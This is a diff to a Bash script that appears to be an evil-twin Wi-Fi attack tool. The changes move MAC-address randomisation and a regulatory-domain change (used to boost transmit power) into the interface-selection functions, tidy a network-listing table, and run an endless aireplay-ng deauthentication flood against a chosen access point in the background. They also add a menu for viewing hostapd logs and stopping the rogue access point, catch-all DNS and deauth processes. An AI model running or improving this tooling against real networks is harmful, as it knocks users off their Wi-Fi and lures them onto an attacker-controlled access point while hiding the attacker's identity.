@@ -67,6 +67,7 @@ selectNetworkInterface () {
 		echo -n "Select a network interface > "
 		read op
 		echo
+		echo "[-] Configuring network interface..."
 
 		tempInterface=${interface[$op]}
 		substring=$(echo $tempInterface | grep "mon")
@@ -87,16 +88,29 @@ selectNetworkInterface () {
 		fi
 	else
 		echo "[x] No network interface found"
+		echo
 		ok=0
 	fi
 
 	if [ $ok -eq 1 ]
 	then
+		echo "[-] Upgrading network interface..."
+                ifconfig $interface down
+                iw reg set US
+                echo "[+] Network interface upgraded"
+
+                echo "[-] Changing MAC address..."
+                macchanger -r $interface >/dev/null
+                ifconfig $interface up
+                echo "[+] MAC address changed"
+
 		echo "[+] Network interface succesfully configured"
+		echo
 	fi
 }
 
 selectNetworkInterface2 () {
+	echo "[-] Configuring network interface..."
         nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
         nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)
 
@@ -130,8 +144,18 @@ selectNetworkInterface2 () {
 
         if [ $ok -eq 1 ]
         then
+		echo "[-] Upgrading network interface..."
+                ifconfig $interface down
+                iw reg set US
+                echo "[+] Network interface upgraded"
+
+                echo "[-] Changing MAC address..."
+                macchanger -r $interface >/dev/null
+                ifconfig $interface up
+                echo "[+] MAC address changed"
+
                 echo "[+] Network interface succesfully configured"
-        	echo
+		echo
 	fi
 
 }
@@ -197,16 +221,16 @@ selectNetwork () {
 
 	        echo "WIFI NETWORKS"
 	        echo "Network interface: $interface"
-		echo "+-----+-------+-------+----------------------------------+"
-	        echo "|  i  |ENCRYPT|CLIENTS|     ESSID                        |"
-	        echo "+-----+-------+-------+----------------------------------+"
+		echo "+----+-------+-------+-----------------------------------+"
+	        echo "| i  |ENCRYPT|CLIENTS|     ESSID                         |"
+	        echo "+----+-------+-------+-----------------------------------+"
 	        i=1
 	        while [ $i -le $num ]
 	        do
-	                printf  '%-1s %-3s %-1s %-5s %-3s %-3s %-1s %-32s %-1s\n'  "|" "$i" "|" "${tencr[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}" "|"
+	                printf  '%-1s %-2s %-1s %-5s %-3s %-3s %-1s %-33s %-1s\n'  "|" "$i" "|" "${tencr[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}" "|"
 	                i=$(( $i + 1 ))
 	        done
-		echo "+-----+-------+-------+----------------------------------+"
+		echo "+----+-------+-------+-----------------------------------+"
 	        echo
 	        read -p "Select a network [0 to repeat scann]> " network
 	done
@@ -221,7 +245,7 @@ selectNetwork () {
 deauth(){
 	iwconfig "$3" channel "$2"
         sleep 3
-        aireplay-ng -0 0 -a "$1" "$3"
+        aireplay-ng -0 0 -a "$1" "$3" >/dev/null &
 }
 
 titulo
@@ -248,20 +272,6 @@ else
 		iptables -F
 		iptables -t nat -F
 		echo "[+] Iptables flushed"
-
-############################# POWER UP WI-FI INTERFACE ###############################
-
-		echo "[-] Upgrading network interface..."
-		ifconfig $interface down
-		iw reg set US
-		echo "[+] Network interface upgraded"
-
-################################ CHANGE MAC ADDRESS ##################################
-
-		echo "[-] Changing MAC address..."
-		macchanger -r $interface >/dev/null
-		ifconfig $interface up
-		echo "[+] MAC address changed"
 
 ################################# HOSTAPD CONFIG #####################################
 
@@ -431,6 +441,28 @@ address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf
 		        then
 				deauth $bssid $channel $interface2
 			fi
+
+			while [ true ]
+			do
+				echo "[1] -> See hostapd logs"
+				echo "[2] -> Stop hostapd and dnsmasq"
+				echo "[3] -> Stop aireplay-ng"
+				read -p ">" op
+				if [ $op -eq 1 ]
+				then
+					cat $tempFolder/hostapd.log
+				elif [ $op -eq 2 ]
+				then
+					pkill hostapd
+					pkill dnsmasq
+				elif [ $op -eq 3 ]
+				then
+					pkill aireplay-ng
+				elif [ $op -le 0 ] || [ $op -ge 4 ]
+				then
+					echo "[x]Please, select a valid option"
+				fi
+			done
 		fi
 	fi
 fi
